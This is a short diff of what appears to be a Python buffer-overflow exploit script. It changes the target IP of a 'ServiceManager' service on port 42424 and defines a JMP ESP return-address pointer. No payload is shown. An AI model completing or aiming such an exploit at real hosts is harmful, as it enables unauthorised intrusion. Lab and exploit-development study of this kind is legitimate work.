@@ -2,7 +2,7 @@
 import socket
 import struct
 
-ServiceManagerIP = "192.168.150.25"
+ServiceManagerIP = "10.0.2.15"
 ServiceManagerPort = 42424
 
 ptr_jmp_esp = 0x080414c3
